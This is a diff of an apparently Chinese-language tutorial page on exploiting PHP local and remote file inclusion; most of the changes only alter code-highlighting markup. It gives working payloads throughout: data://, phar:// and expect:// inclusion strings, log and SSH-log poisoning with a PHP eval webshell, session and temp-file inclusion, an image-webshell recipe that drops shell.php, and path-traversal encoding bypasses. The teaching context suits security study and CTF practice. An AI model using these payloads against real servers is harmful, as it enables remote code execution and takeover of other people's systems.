+            <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;"</span>.<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>).<span class="hljs-string">"\\<span class="hljs-subst">{$target_path}</span> succesfully uploaded!&lt;/pre&gt;"</span>;
+        }
+    }
+    <span class="hljs-keyword">else</span> {
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;pre&gt;you can upload jpg,png,zip....&lt;/pre&gt;'</span>;
+    }
+}
+ <span class="hljs-meta">?&gt;</span>
      
-//传参的时候利用上面的poc，此时会成功绕过，并且执行phpinfo.txt文件里的代码（被当做php代码执行）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h3 id="2-4-data-与phar">2.4 data://与phar://</h3>
+<span class="hljs-comment">//传参的时候利用上面的poc，此时会成功绕过，并且执行phpinfo.txt文件里的代码（被当做php代码执行）</span></code></pre>
+<h3 id="24-data与phar">2.4 data://与phar://</h3>
 <p><strong>data:// 同样类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致任意代码执行。(这是一个输入流执行的协议，它可以向服务器输入数据，而服务器也会执行。)</strong></p>
 <p>利用条件:</p>
 <ol>
@@ -627,25 +299,25 @@ you can upload jpg,png,zip....<span class="token tag"><span class="token tag"><s
 <li>allow_url_fopen = On</li>
 <li>allow_url_include = On</li>
 </ol>
-<pre class="line-numbers language-none"><code class="language-none">poc:若纯文字没用可用[base64编码]
+<pre><code class="hljs plaintext">poc:若纯文字没用可用[base64编码]
 data://[&lt;MIME-type&gt;][;charset=&lt;encoding&gt;][;base64],&lt;data&gt;
 ?file=data://,&lt;?php phpinfo();?&gt;
 ?file=data://text/plain,&lt;?php phpinfo();?&gt;
 ?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
 ?file=data:text/plain,&lt;?php phpinfo();?&gt;
-?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+</code></pre>
 <p><strong>phar:// 有点类似zip://同样可以导致 任意代码执行。</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">phar://中相对路径和绝对路径都可以使用
+<pre><code class="hljs plaintext">phar://中相对路径和绝对路径都可以使用
 利用条件：
-php版本大于等于php5.3.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<pre class="line-numbers language-none"><code class="language-none">poc:
+php版本大于等于php5.3.0</code></pre>
+<pre><code class="hljs plaintext">poc:
 假设有个文件phpinfo.txt，其内容为&lt;?php phpinfo(); ?&gt;，打包成zip压缩包，如下：
 指定绝对路径
 index.php?file=phar://D:/phpStudy/WWW/fileinclude/test.zip/phpinfo.txt
 
 或者使用相对路径（这里test.zip就在当前目录下）
-index.php?file=phar://test.zip/phpinfo.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h3 id="2-5-expect-伪协议">2.5 expect://伪协议</h3>
+index.php?file=phar://test.zip/phpinfo.txt</code></pre>
+<h3 id="25-expect伪协议">2.5 expect://伪协议</h3>
 <p>expect://伪协议用来执行系统命令，但是需要安装拓展<br>
 用法: <code>?file=expect://ls</code></p>
 <h2 id="0x03-特殊文件包含">0x03 特殊文件包含</h2>
@@ -666,20 +338,20 @@ index.php?file=phar://test.zip/phpinfo.txt<span aria-hidden="true" class="line-n
 <p>中间件开启了访问日志记录功能，会访问日志写入到日志文件中。<br>
 假设访问URL：<a target="_blank" rel="noopener" href="http://192.168.1.2/xxx/index.php">http://192.168.1.2/xxx/index.php</a><br>
 发现会在日志文件中有如下内容：</p>
-<pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token punctuation">[</span>root@aaa<span class="token punctuation">]</span>#less <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>log<span class="token operator">/</span>httpd<span class="token operator">/</span>access_log
-<span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.200</span> <span class="token operator">-</span> <span class="token operator">-</span> <span class="token punctuation">[</span><span class="token number">09</span><span class="token operator">/</span>Aug<span class="token operator">/</span><span class="token number">2021</span><span class="token punctuation">:</span><span class="token number">19</span><span class="token punctuation">:</span><span class="token number">31</span><span class="token punctuation">:</span><span class="token number">20</span> <span class="token operator">+</span><span class="token number">0800</span><span class="token punctuation">]</span> <span class="token string">"GET /xxx/index.php HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">86</span><span class="token range operator">..</span><span class="token range operator">..</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<pre><code class="hljs csharp">[<span class="hljs-meta">root@aaa</span>]<span class="hljs-meta">#less /var/log/httpd/access_log</span>
+<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.200</span> - - [<span class="hljs-number">09</span>/Aug/<span class="hljs-number">2021</span>:<span class="hljs-number">19</span>:<span class="hljs-number">31</span>:<span class="hljs-number">20</span> +<span class="hljs-number">0800</span>] <span class="hljs-string">"GET /xxx/index.php HTTP/1.1"</span> <span class="hljs-number">200</span> <span class="hljs-number">86.</span>...</code></pre>
 <p>中间件日志访问会记录访问者的IP地址、访问时间、访问路径、返回状态码等等。<br>
 利用中间件访问记录路径到日志文件中的功能，将恶意代码写入到日志文件当中去：<br>
 添加恶意代码：<code>http://www.abc.com/xxx/&lt;?php @eval($_POST[123]);?&gt;</code><br>
 此时会提示404，但是不急<br>
 查看日志文件，发现已经将内容写入</p>
-<pre class="line-numbers language-perl" data-language="perl"><code class="language-perl"><span class="token punctuation">[</span>root<span class="token variable">@aaa</span><span class="token punctuation">]</span><span class="token comment">#less /var/log/httpd/access_log</span>
-<span class="token v-string string">192.168.1.200</span> <span class="token operator">-</span> <span class="token operator">-</span> <span class="token punctuation">[</span><span class="token number">09</span><span class="token operator">/</span>Aug<span class="token regex">/2021:19:35:23 +0800] "GET /xx</span><span class="token operator">x</span><span class="token operator">/</span><span class="token variable">%3</span>C<span class="token operator">?</span>php <span class="token variable">@eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">123</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token variable">%3</span>E HTTP<span class="token operator">/</span><span class="token number">1.1</span>" <span class="token number">404</span> <span class="token number">826</span><span class="token operator">...</span><span class="token operator">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<pre><code class="hljs perl">[root@aaa]<span class="hljs-comment">#less /var/log/httpd/access_log</span>
+<span class="hljs-number">192.168</span>.<span class="hljs-number">1.200</span> - - [09/Aug/<span class="hljs-number">2021</span>:<span class="hljs-number">19</span>:<span class="hljs-number">35</span>:<span class="hljs-number">23</span> +080<span class="hljs-number">0</span>] <span class="hljs-string">"GET /xxx/%3C?php @eval($_POST[123]);?%3E HTTP/1.1"</span> <span class="hljs-number">404</span> <span class="hljs-number">826</span>....</code></pre>
 <p>虽然已经写入到日志文件中去了，但是浏览器进行了URL编码，导致传入的代码不能正常使用<br>
 <strong>可以通过burpsuite抓包的方式写入恶意代码，这样不会被浏览器进行URL编码</strong><br>
 查看日志文件，内容如下</p>
-<pre class="line-numbers language-php-template" data-language="php-template"><code class="language-php-template">[root@aaa]#less /var/log/httpd/access_log
-192.168.1.200 - - [09/Aug/2021:19:37:33 +0800] "GET /xxx/&lt;?php @eval($_POST[123]);?&gt; HTTP/1.1" 404 302....<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<pre><code class="hljs php-template"><span class="language-xml">[root@aaa]#less /var/log/httpd/access_log</span>
+<span class="language-xml">192.168.1.200 - - [09/Aug/2021:19:37:33 +0800] "GET /xxx/</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">123</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> HTTP/1.1" 404 302....</span></code></pre>
 <p>恶意代码成功写入</p>
 <p><strong>2. 文件包含日志文件</strong></p>
 <p>要执行文件包含，必须要知道日志文件的位置。<br>
@@ -687,22 +359,22 @@ index.php?file=phar://test.zip/phpinfo.txt<span aria-hidden="true" class="line-n
 输入测试语句<code>http://www.abc.com/xxx/file.php?file=../../../var/log/httpd/access_log</code><br>
 之后在向网页传入POST参数：<code>123=phpinfo</code><br>
 即可显示出phpinfo的内容</p>
-<h3 id="3-1-包含Apache日志文件">3.1 包含Apache日志文件</h3>
+<h3 id="31-包含apache日志文件">3.1 包含Apache日志文件</h3>
 <p><strong>WEB服务器一般会将用户的访问记录保存在访问日志中。那么我们可以根据日志记录的内容，精心构造请求，把PHP代码插入到日志文件中，通过文件包含漏洞来执行日志中的PHP代码。</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">利用条件：
+<pre><code class="hljs plaintext">利用条件：
 对日志文件可读
 知道日志文件的存储目录
 
 注意：
 一般情况下日至存储目录会被修改，需要读取服务器配置文件(httpd.conf,nginx.conf....)或者根据phpinfo()中的信息来得知
 
-日志记录的信息都可以被调整，比如记录报错的等级，或者内容格式<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+日志记录的信息都可以被调整，比如记录报错的等级，或者内容格式</code></pre>
 <p><strong>Apache运行后一般默认会生成两个日志文件，Windos下是access.log（访问日志）和error.log(错误日志)，Linux下是access_log和error_log，访问日志文件记录了客户端的每次请求和服务器响应的相关信息。<br>
   如果访问一个不存在的资源时，如<a target="_blank" rel="noopener" href="http://www.xxxx.com/">http://www.xxxx.com/</a><!--?php phpinfo(); ?-->,则会记录在日志中，但是代码中的敏感字符会被浏览器转码，我们可以通过burpsuit绕过编码，就可以把<!--?php phpinfo(); ?--> 写入apache的日志文件，然后可以通过包含日志文件来执行此代码，但前提是你得知道apache日志文件的存储路径，所以为了安全起见，安装apache时尽量不要使用默认路径。</strong></p>
 <p>参考文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/my1e3/p/5854897.html">1.包含日志文件getshell</a><br>
      <a target="_blank" rel="noopener" href="https://chybeta.github.io/2017/08/06/SHACTF-2017-Web-writeup/#Methon-Two">2.一道包含日志文件的CTF题</a></p>
 <p>这里提供一道包含日志的CTF题目：<a target="_blank" rel="noopener" href="https://chybeta.github.io/2017/08/06/SHACTF-2017-Web-writeup/#Methon-Two">SHACTF-2017- Bon Appétit (100)-writeup</a></p>
-<h3 id="3-2-包含SSH-log日志文件">3.2 包含SSH log日志文件</h3>
+<h3 id="32-包含ssh-log日志文件">3.2 包含SSH log日志文件</h3>
 <p>利用条件：需要知道ssh-log的位置，且可读。默认情况下为 /var/log/auth.log</p>
 <p>下面介绍漏洞利用步骤</p>
 <p><strong>1. 将恶意代码写入文件</strong></p>
@@ -715,7 +387,7 @@ index.php?file=phar://test.zip/phpinfo.txt<span aria-hidden="true" class="line-n
 之后再向网页传入POST参数：<code>123=phpinfo</code><br>
 就可以出现phpinfo的内容了</p>
 <p>参考：[<a target="_blank" rel="noopener" href="http://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/">RCE with LFI and SSH Log Poisoning</a>]</p>
-<h3 id="3-3-包含environ">3.3 包含environ</h3>
+<h3 id="33-包含environ">3.3 包含environ</h3>
 <p>利用条件：</p>
 <ol>
 <li>php以cgi方式运行，这样environ才会保持UA头。</li>
@@ -728,13 +400,13 @@ index.php?file=phar://test.zip/phpinfo.txt<span aria-hidden="true" class="line-n
 <li><a target="_blank" rel="noopener" href="http://websecuritylog.blogspot.jp/2010/06/procselfenviron-injection.html">The proc/self/environ Injection</a></li>
 <li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/papers/12886/">shell via LFI - proc/self/environ method</a></li>
 </ol>
-<h3 id="3-4-包含fd">3.4 包含fd</h3>
+<h3 id="34-包含fd">3.4 包含fd</h3>
 <p>与前面的方法类似<code>/proc/self/environ</code>，可以将代码引入 proc 日志文件中，这些代码可以通过易受攻击的 LFI 脚本执行。通常，您会使用 burp 或 curl 将 PHP 代码注入到<code>referer</code>.</p>
 <p>这种方法有点棘手，因为包含 Apache 错误日志信息的 proc 文件在<code>/proc/self/fd/</code>等下发生了变化<code>/proc/self/fd/2</code>。我建议使用 Burp Intruder + FuzzDB 的<a target="_blank" rel="noopener" href="https://github.com/tennc/fuzzdb/blob/master/dict/BURP-PayLoad/LFI/LFI-FD-check.txt">LFI-FD</a><code>/proc/self/fd/10</code>暴力破解 /proc/self/fd/ 目录的目录结构<a target="_blank" rel="noopener" href="https://github.com/tennc/fuzzdb/blob/master/dict/BURP-PayLoad/LFI/LFI-FD-check.txt">-Check.txt</a>可能的 proc 文件列表，然后您可以监控返回的页面大小并进行调查。</p>
 <p>参考： <a target="_blank" rel="noopener" href="https://highon.coffee/blog/lfi-cheat-sheet/#procselffd-lfi-method">LFI Cheat Sheet：/proc/self/environ LFI Method</a></p>
-<h3 id="3-5-包含SESSION">3.5 包含SESSION</h3>
+<h3 id="35-包含session">3.5 包含SESSION</h3>
 <p><strong>可以先根据尝试包含到SESSION文件，在根据文件内容寻找可控变量，在构造payload插入到文件中，最后包含即可。</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">利用条件：
+<pre><code class="hljs plaintext">利用条件：
 找到Session内的可控变量
 Session文件可读写，并且知道存储路径
 
@@ -743,22 +415,22 @@ Session文件可读写，并且知道存储路径
 通过phpinfo的信息获取session的存储位置。
 通过phpinfo的信息获取session.save_path
 通过猜测默认的session存储位置进行尝试
-通常Linux中的Session的默认存储位置在/var/lib/php/session目录下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+通常Linux中的Session的默认存储位置在/var/lib/php/session目录下</code></pre>
 <p><strong>php的session文件的保存路径可以在phpinfo的session.save_path看到。</strong></p>
-<p><img src="image-20230321200640758.png" alt="image-20230321200640758"></p>
-<pre class="line-numbers language-none"><code class="language-none">session常见存储路径：
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230321200640758.png" alt="image-20230321200640758"></p>
+<pre><code class="hljs plaintext">session常见存储路径：
 
 /var/lib/php/sess_PHPSESSID
 /var/lib/php/sess_PHPSESSID
 /tmp/sess_PHPSESSID
 /tmp/sessions/sess_PHPSESSID
-session文件格式： sess_[phpsessid] ，而 phpsessid 在发送的请求的 cookie 字段中可以看到。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+session文件格式： sess_[phpsessid] ，而 phpsessid 在发送的请求的 cookie 字段中可以看到。</code></pre>
 <p>参考文章：<a target="_blank" rel="noopener" href="https://chybeta.github.io/2017/11/09/%E4%B8%80%E9%81%93CTF%E9%A2%98%EF%BC%9APHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">一道SESSION包含的CTF题</a></p>
 <p><strong>示例分析：</strong></p>
 <p>session文件包含代码如下</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$ctfs</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctfs'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$ctfs</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<pre><code class="hljs php"><span class="hljs-title function_ invoke__">session_start</span>();
+<span class="hljs-variable">$ctfs</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'ctfs'</span>];
+<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'username'</span>]=<span class="hljs-variable">$ctfs</span></code></pre>
 <p>此代码可以通过GET型的ctfs参数传入。PHP代码将会获取的值存入到Session中。<br>
 攻击者可以利用ctfs参数将恶意代码写入到session文件中，然后在利用文件包含漏洞包含此session文件，向系统中传递恶意代码。</p>
 <p><strong>漏洞分析</strong></p>
@@ -785,47 +457,47 @@ session文件的内容为：<code>username|s:18:"&lt;?php phpinfo();?&gt;"</code
 <li>通过本地文件包含漏洞可以解析session文件达到攻击的目的</li>
 </ul>
 <p>比如：<code>http://www.abc.com/xxx/file.php?file=../../var/lib/php/session/sess_7sdfysdfywy9323cew2</code></p>
-<h3 id="3-6-包含临时文件">3.6 包含临时文件</h3>
-<p><img src="image-20230321200926394.png" alt="image-20230321200926394"></p>
+<h3 id="36-包含临时文件">3.6 包含临时文件</h3>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230321200926394.png" alt="image-20230321200926394"></p>
 <p><strong>php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\winsdows\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。</strong></p>
 <p><strong>由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。</strong></p>
 <p><strong>另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。这个方法可以参考[LFI With PHPInfo Assistance](<a target="_blank" rel="noopener" href="https://www.insomniasec.com/downloads/publications/LFI">https://www.insomniasec.com/downloads/publications/LFI</a> With PHPInfo Assistance.pdf)</strong></p>
 <p><strong>类似利用临时文件的存在，竞争时间去包含的，可以看看这道CTF题：<a target="_blank" rel="noopener" href="https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-babyweb-writeup/">XMAN夏令营-2017-babyweb-writeup</a></strong></p>
-<h3 id="3-7-包含上传文件">3.7 包含上传文件</h3>
+<h3 id="37-包含上传文件">3.7 包含上传文件</h3>
 <p><strong>很多网站通常会提供文件上传功能，比如：上传头像、文档等，这时就可以采取上传一句话图片木马的方式进行包含。</strong></p>
 <p><strong>图片马的制作方式如下，在cmd控制台下输入：</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">进入1.jph和2.php的文件目录后，执行：
+<pre><code class="hljs plaintext">进入1.jph和2.php的文件目录后，执行：
 
 copy  1.jpg/b+2.php  3.jpg
 
-将图片1.jpg和包含php代码的2.php文件合并生成图片马3.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+将图片1.jpg和包含php代码的2.php文件合并生成图片马3.jpg</code></pre>
 <p><strong>假设已经上传一句话图片木马到服务器，路径为<code>/upload/201811.jpg</code></strong><br>
 <strong>图片代码如下：</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;?fputs(fopen("shell.php","w"),"&lt;?php eval($_POST['pass']);?&gt;")?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre><code class="hljs plaintext">&lt;?fputs(fopen("shell.php","w"),"&lt;?php eval($_POST['pass']);?&gt;")?&gt;</code></pre>
 <p><strong>然后访问URL：<code>http://www.xxxx.com/index.php?page=./upload/201811.jpg</code>，包含这张图片，将会在<code>index.php</code>所在的目录下生成<code>shell.php</code></strong></p>
-<h3 id="3-8-其他包含姿势">3.8 其他包含姿势</h3>
-<pre class="line-numbers language-none"><code class="language-none">包含SMTP(日志)
-包含xss<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h3 id="38-其他包含姿势">3.8 其他包含姿势</h3>
+<pre><code class="hljs plaintext">包含SMTP(日志)
+包含xss</code></pre>
 <h2 id="0x04-绕过方法">0x04 绕过方法</h2>
-<h3 id="4-1-指定前缀绕过">4.1 指定前缀绕过</h3>
-<h4 id="4-1-1-目录遍历">4.1.1 目录遍历</h4>
+<h3 id="41-指定前缀绕过">4.1 指定前缀绕过</h3>
+<h4 id="411-目录遍历">4.1.1 目录遍历</h4>
 <p><strong>使用 …/…/ 来返回上一目录，被称为目录遍历(Path Traversal)。例如 ?file=…/…/phpinfo/phpinfo.php</strong><br>
 <strong>测试代码如下：</strong></p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-	<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-	<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-	<span class="token comment">//前缀</span>
-	<span class="token keyword">include</span> <span class="token string double-quoted-string">"/var/www/html/"</span><span class="token operator">.</span><span class="token variable">$file</span><span class="token punctuation">;</span>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+	<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
+	<span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file"</span>];
+	<span class="hljs-comment">//前缀</span>
+	<span class="hljs-keyword">include</span> <span class="hljs-string">"/var/www/html/"</span>.<span class="hljs-variable">$file</span>;
 
-	<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
+<span class="hljs-meta">?&gt;</span></code></pre>
 <p><strong>现在在/var/log目录下有文件flag.txt，则利用…/可以进行目录遍历，比如我们尝试访问：</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">include.php?file=../../log/flag.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre><code class="hljs plaintext">include.php?file=../../log/flag.txt</code></pre>
 <p><strong>则服务器端实际拼接出来的路径为：/var/www/html/…/…/log/test.txt，即 /var/log/flag.txt，从而包含成功。</strong></p>
-<h4 id="4-1-2-编码绕过">4.1.2 编码绕过</h4>
+<h4 id="412-编码绕过">4.1.2 编码绕过</h4>
 <p><strong>服务器端常常会对于…/等做一些过滤，可以用一些编码来进行绕过。</strong><br>
 <strong>1.利用url编码</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">../
+<pre><code class="hljs plaintext">../
 
     %2e%2e%2f
     ..%2f
@@ -835,16 +507,16 @@ copy  1.jpg/b+2.php  3.jpg
 
     %2e%2e%5c
     ..%5c
-    %2e%2e\<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+    %2e%2e\</code></pre>
 <p><strong>2.二次编码</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">../
+<pre><code class="hljs plaintext">../
 
     %252e%252e%252f
 ..\
 
-    %252e%252e%255c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+    %252e%252e%255c</code></pre>
 <p><strong>3.容器/服务器的编码方式</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">../
+<pre><code class="hljs plaintext">../
 
     ..%c0%af
         注：Why does Directory traversal attack %C0%AF work?
@@ -856,24 +528,24 @@ copy  1.jpg/b+2.php  3.jpg
 
 ..\
 
-    ..%c1%9c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+    ..%c1%9c</code></pre>
 <p>注：那里的超链接是：<a target="_blank" rel="noopener" href="https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work">Why does Directory traversal attack %C0%AF work?</a></p>
-<h3 id="4-2-指定后缀绕过">4.2 指定后缀绕过</h3>
+<h3 id="42-指定后缀绕过">4.2 指定后缀绕过</h3>
 <p><strong>后缀绕过测试代码如下，下述各后缀绕过方法均使用此代码：</strong></p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-	<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-	<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-	<span class="token comment">//后缀</span>
-	<span class="token keyword">include</span> <span class="token variable">$file</span><span class="token operator">.</span><span class="token string double-quoted-string">".txt"</span><span class="token punctuation">;</span>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+	<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
+	<span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file"</span>];
+	<span class="hljs-comment">//后缀</span>
+	<span class="hljs-keyword">include</span> <span class="hljs-variable">$file</span>.<span class="hljs-string">".txt"</span>;
 
-	<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="4-2-1-利用url">4.2.1 利用url</h4>
+	<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
+<span class="hljs-meta">?&gt;</span></code></pre>
+<h4 id="421-利用url">4.2.1 利用url</h4>
 <p><strong>在远程文件包含漏洞（RFI）中，可以利用query或fragment来绕过后缀限制。<br>
 可参考此文章：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/2c07fbb52b45">URI’s fragment</a></strong></p>
 <p><strong>完整url格式：</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">protocol :// hostname[:port] / path / [;parameters][?query]#fragment<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<pre class="line-numbers language-none"><code class="language-none">query(?)
+<pre><code class="hljs plaintext">protocol :// hostname[:port] / path / [;parameters][?query]#fragment</code></pre>
+<pre><code class="hljs plaintext">query(?)
 
     [访问参数] ?file=http://localhost:8081/phpinfo.php?
     [拼接后]  ?file=http://localhost:8081/phpinfo.php?.txt
@@ -887,22 +559,22 @@ copy  1.jpg/b+2.php  3.jpg
   
   #号绕过：
   ?file=http://localhost:8081/phpinfo.php%23.txt
-	注：这里需要对#进行url编码，#的url编码为%23<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	注：这里需要对#进行url编码，#的url编码为%23</code></pre>
 <p><strong>Example：</strong>（设在根目录下有flag2.txt文件）</p>
-<p><img src="image-20230321203740146.png" alt="image-20230321203740146"></p>
-<pre class="line-numbers language-none"><code class="language-none">fragment(#)
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230321203740146.png" alt="image-20230321203740146"></p>
+<pre><code class="hljs plaintext">fragment(#)
 
     [访问参数] ?file=http://localhost:8081/phpinfo.php%23
-    [拼接后]  ?file=http://localhost:8081/phpinfo.php#.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+    [拼接后]  ?file=http://localhost:8081/phpinfo.php#.txt</code></pre>
 <p><strong>Example：</strong>（设在根目录下有flag2.txt文件）</p>
-<p><img src="image-20230321203837999.png" alt="image-20230321203837999"></p>
